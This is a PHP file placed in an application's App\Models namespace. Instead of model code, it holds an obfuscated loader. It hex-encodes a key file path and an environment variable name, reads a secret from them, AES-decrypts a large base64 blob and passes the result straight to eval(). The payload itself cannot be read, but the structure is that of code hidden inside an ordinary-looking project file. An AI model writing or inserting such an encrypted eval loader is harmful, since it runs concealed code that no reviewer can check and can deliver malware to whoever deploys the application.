<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cXwd77dbYxUbcrgn7PX+kQ==');

$c=base64_decode(

'GUIHKkMRMyXejRJQS+t/bq6KKCNZAcay/9YvyabndQUJnMu+6eOcMbIsvv+T0kM9fe3Ccp7nDrG6' .
'd4ulMWBrun12zMmXwQpWicR3LTaz9+h41WqTteLgQ5Jl2u3xnxHrxNlXTM/snFC8dY/WX2EXOKoC' .
'Fz1MnvYZCN7C2+hlhMF7FFaE0p4LQ0fWZkFAMQEVLFpkKEyTn9GIUeVRHDgLxi7+XVEss2XTIIUN' .
'bx973NrjnyT+WhGXOkXZzmCYZB7Y5cNLD//wdXpzw0IE+3boc26PXMdB7PmVW/Tg1N40T9FPsGv2' .
'vqlCQT1Tbr/g0RspPwQFlPngMtx5TifXggKHOdB+zFDGtYKrqtgEMZibCDm7HLfc7HY+ljH5V++5' .
'WzI1z5n6GjJgPG1dGRnuaiFVIqCv8SKuAIHNhr0BZaVg/LR8EOaTheT4LjZ3sZYIFbQHyqroutDB' .
'YoKO7YSggt5Z7iRvc0tW4Liv95pmIwq7fyXTvcGaZSXFF8rtup1ajsL6XYk1UOQIao4La4Hd0RLW' .
'DIk4YKMLqAFB0fC+SgD5A9c05bYNbBzrdYvZQkGLxfcFRac559M5u8zbYOid2zixVbMR95nhRCxJ' .
'8WgnvpPmwVG4kXuPyxKZmn1ba5pf3f4TVAyYN3a6llZK/WiLwyCbnpzTKwrNFPmFJ/IeAzKXL1EK' .
'kAJ9dQ8eZEITr5i0CfV9hHdxM5qCGguqYL7X4XmDE0+ETcYtiN8FfRlZkqJ8Ud3htShTYNNkSGZJ' .
'68sIFzuUR6nl4pEGtZR2ZH0TzNCXaaTk7Z9QK//Qjctt7n+wkRcjz875Mn2aYbVmI4fsC38rE0jf' .
'S46plfDHmQ4OJzCyEWQ7PZppWO0lg83Dg22L+AVWI925ZqPX67XGHivL994DEWINbXRtqq21M8L4' .
'Z1eEcVjxDN3GwOXoraI9yu10JNH5eCoRrhVtRrTpgBtwtJpw/NQF6Jkc2AWdSTi56buZ0i3FUj39' .
'xs4x5dsnv1qItAHobxuNAlJOuCGLYlNsff2bMhupTEyR3KJ6xYxnxQ7MGjfruG4d7cgs+ErzCjZI' .
'Xq1XDWTAK58N2eIDbEt43AienpXURZkFg9MMw/dU6L8Px805YOo5SO+MogG9q78bGAAxqFGLfvy1' .
'ZiAO9HPoiL9mCDLu/TpYG8qWNoGoPt5IJZyB30gCQlyOxg9TZ+5v9pgCLifkZDQjoSvgIHrpJXtH'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

